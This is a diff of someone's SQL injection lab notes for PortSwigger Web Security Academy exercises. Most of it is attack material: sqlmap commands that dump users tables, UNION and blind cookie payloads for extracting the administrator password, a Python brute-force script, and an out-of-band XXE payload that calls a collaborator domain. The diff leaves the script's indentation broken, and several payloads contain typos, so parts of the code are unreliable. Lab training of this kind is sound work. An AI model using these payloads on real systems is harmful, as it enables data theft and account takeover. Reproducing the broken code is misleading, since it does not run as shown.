@@ -214,10 +214,14 @@ Or you can use this method just increase the number.
 Or you can use the Best way Use the SQLMap tool 
 	1. First use the Burp suite to get the request that have the parameter that have the SQL injection and with right click **Save Item** to use it with SQL Map.
 	2. command with SQL Map `python3 sqlmap.py -r fileyousave -p category`
+1. 
 	![](assets/Pasted%20image%2020251010023250.png)
-	3. dump database `python3 sqlmap.py -r fileyousave -D public --tables!`
+	3.
+	3.dump database `python3 sqlmap.py -r fileyousave -D public --tables!`
+	
 	![](assets/Pasted%20image%2020251010023648.png)
 	![](assets/Pasted%20image%2020251010023710.png)
+
 	4. get the tables name `python3 sqlmap.py -r fileyousave -D public `
 
 ![](assets/Pasted%20image%2020251010023612.png)
@@ -237,6 +241,7 @@ The lab will provide a random value that you need to make appear within the quer
 **Solution:**
 
 with SQL map 
+
 ![](assets/Pasted%20image%2020251010023250.png)
 
 Gifts' UNION ALL SELECT NULL,(CHR(113)||CHR(113)||CHR(112)||CHR(112)||CHR(113))||(CHR(81)||CHR(110)||CHR(78)||CHR(107)||CHR(78)||CHR(66)||CHR(113)||CHR(105)||CHR(72)||CHR(98)||CHR(115)||CHR(77)||CHR(87)||CHR(122)||CHR(86)||CHR(84)||CHR(98)||CHR(107)||CHR(76)||CHR(87)||CHR(66)||CHR(87)||CHR(111)||CHR(111)||CHR(66)||CHR(71)||CHR(69)||CHR(83)||CHR(84)||CHR(71)||CHR(67)||CHR(83)||CHR(101)||CHR(76)||CHR(112)||CHR(90)||CHR(121)||CHR(110)||CHR(101)||CHR(87))||(CHR(113)||CHR(120)||CHR(98)||CHR(106)||CHR(113)),NULL-- 0x11
@@ -260,15 +265,19 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 **Solution:**
 
 `python3 sqlmap.py -r ../../anwer/Desktop/Gifts -p category --dbs`
+
 ![](assets/Pasted%20image%2020251010074140.png)
 
 `python3 sqlmap.py -r ../../anwer/Desktop/Gifts -p category -D public --tables`
+
 ![](assets/Pasted%20image%2020251010074234.png)
 
 `python3 sqlmap.py -r ../../anwer/Desktop/Gifts -p category -D public -T users --columns`
+
 ![](assets/Pasted%20image%2020251010074311.png)
 
-`python3 sqlmap.py -r ../../anwer/Desktop/Gifts -p category -D public -T users --columns --dump`
+`python3 sqlmap.py -r ../../anwer/Desktop/Gifts -p category -D public -T users --columns --dump
+`
 ![](assets/Pasted%20image%2020251010074354.png)
 
 Gifts' UNION ALL  SELECT NULL, 'qbpzqylWuNgsypHjbhgwyfayKWXoklYtVNguBJkJULyWHqkxzq', NULL-- 0x11
@@ -310,12 +319,15 @@ To solve the lab, log in as the `administrator` user.
 
 1. Check the parameter **TrackingId** has SQL injection vulnerability.
 	- by putting the `'` after the real `TrackingId=Vfnb2EsFrcwE4KWg'`
+	
 	![](assets/Pasted%20image%2020251010222140.png)
 	
 2.  Check with operators OR/AND command to see the cases that welcome Message that appear
 	- `TrackingId=Vfnb2EsFrcwE4KWg' OR '1'=1-- -`
+	
 	![](assets/Pasted%20image%2020251010204044.png)
-	- ```
+	
+	  ```
 	  TrackingId=Vfnb2EsFrcwE4KWg' OR '1'=2 -- it will work 
 	  TrackingId=Vfnb2EsFrcwE4KWg'AND '1'=1 -- it will work
 	  TrackingId=Vfnb2EsFrcwE4KWg' AND '1'=2 -- it not work 
@@ -329,18 +341,22 @@ To solve the lab, log in as the `administrator` user.
 	
 3. Check this database have the table called **users** 
 	- `TrackingId=Vfnb2EsFrcwE4KWg' AND (SELECT 'a' FROM users LIMIT=1)='a`
+	
 	![](assets/Pasted%20image%2020251010205116.png)
 
 
 4. Check that table users content the user called **administrator** 
 	- `TrackingId=Vfnb2EsFrcwE4KWg' AND (SELECT 'a' FROM users WHRER username='administrator')='a`
+	
 	![](assets/Pasted%20image%2020251010205234.png)
 
 5. Check the length of the password for the user **administrator** greater than 1
 	- `TrackingId=Vfnb2EsFrcwE4KWg' AND (SELECT 'a' FROM users WHERE uaername='administrator' AND LENGTH(password)>1)='a`
 	- you can increase the number of length for password to get the correct length for the password. OR you can go to **Intruder** and change the number automatic you can get the length of password will equal 20.
+	
 	![](assets/Pasted%20image%2020251010205405.png)
 	![](assets/Pasted%20image%2020251010205507.png)
+	
 	- `TrackingId=Vfnb2EsFrcwE4KWg' AND (SELECT 'a' FROM users WHERE uaername='administrator' AND LENGTH(password)>20)='a`.
 	
 	
@@ -349,6 +365,7 @@ To solve the lab, log in as the `administrator` user.
 	- `TrackingId=Vfnb2EsFrcwE4KWg' AND (SELECT substring(password,1,1) FROM users WHERE uaername='administrator')='a'--`
 	
 	- and this step you cannot do manually you can use Burp Suite with **Intruder** it will do this better
+	
 	![](assets/Pasted%20image%2020251012130001.png)
 
 	![](assets/Pasted%20image%2020251012130048.png)
@@ -357,6 +374,7 @@ To solve the lab, log in as the `administrator` user.
 		`Cookie: TrackingId=KiZNMeTbfYG3ePxt' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a;`
 		
 	![](assets/Pasted%20image%2020251012124900.png)
+	
 	now you can collect the every number and what the character opposite to.
 ---
 ---
@@ -398,59 +416,33 @@ import requests
 from string import ascii_lowercase, digits
 
 def main():
-
 	url = 'https://0a9900a203b9686d806ba88300db0081.web-security-academy.net/'
 	trackingid = 'YOUR_TRACKINGID'
 	chars = ascii_lowercase + digits
 	position = 1
 	password = ''
-
 	try:
 		while True:
-			for character in chars:
-			
+			for character in chars:	
 				payload = f"""{trackingid}'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"""
 				
 				cookie = {
 				'session': 'YOUR_SESSIONID',
 				'TrackingId': payload
-				}
-				
-				  
+				} 
 				r = requests.get(url, cookies=cookie)
-				
-				
 				if r.status_code == 200:
-				
-				# print('Error occurred')
-				
 					continue
-				
 				else:
-				
-				# print('No error')
-				
 				position += 1
-				
 				password += ''.join(character)
-				
 				print(f'[+] Found password: {password}', end='\r')
-				
 				break
-			
-			  
-			
 			if len(password) >= 20:
-			
-			print(f'[+] administrator password: {password}')
-			
+			print(f'[+] administrator password: {password}')	
 			exit()
-	
 	except KeyboardInterrupt:
-	
 	print('\n[*] Bye!')
-
-  
 if __name__ == '__main__':
 
 main()
@@ -471,6 +463,7 @@ main()
 ## 13. Lab: Visible error-based SQL injection
 
 With the first request you can send it and the response will be 
+
 ![](assets/Pasted%20image%2020251014182124.png)
 
 ![](assets/Pasted%20image%2020251014203055.png)
@@ -567,6 +560,7 @@ First open the collaborator and take the domain to use it as a third party
 ![](assets/Pasted%20image%2020251016115415.png)
 
 `'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wrrduhx89k31cjo4bta3xsq0drji7cv1.oastify.com/"> %remote;]>'),'/l') FROM dual --`
+
 
 ![](assets/Pasted%20image%2020251016115041.png)
 
